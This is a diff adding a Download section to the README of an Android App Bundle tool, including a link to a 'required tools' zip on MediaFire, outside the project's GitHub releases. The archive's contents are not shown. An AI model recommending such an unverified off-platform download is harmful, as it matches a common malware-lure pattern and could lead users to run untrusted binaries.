@@ -66,3 +66,15 @@ The GUI is a frontend for the real CLI engine. Results displayed by the GUI come
 **Zuhaib**
 
 Built with ❤️ by ZebDroid.
+
+## Download
+
+Download the latest release of **ZebDroid Bundle Studio** from the GitHub Releases page.
+
+### Required Tools
+
+Some bundled tools are distributed separately because of their file size.
+
+[⬇️ Download BundleStudio Tools Package](https://www.mediafire.com/file/vt067aq6ewpbccy/BundleStudio.zip/file)
+
+The package contains the required tools for AAB analysis, inspection, signing, APK generation, and other bundle operations.
